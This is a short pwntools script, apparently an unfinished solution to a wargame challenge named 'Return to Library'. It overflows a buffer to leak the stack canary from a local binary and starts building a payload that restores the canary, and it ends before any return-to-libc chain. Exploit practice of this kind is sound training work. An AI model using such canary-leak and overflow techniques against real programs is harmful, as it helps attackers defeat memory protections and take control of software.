from pwn import *

# port = 17440
# rem = remote("srv1.kitriwhs.kr", port)
rem = process('./Return to Library/rtl')

payload = b'A' * 0x39
rem.sendafter(b'Buf: ', payload)
rem.recvuntil(payload)
canary = u64(b'\x00' + rem.recvn(7))

payload += p64(canary)
payload += b'\x00' * 0x8
print(payload)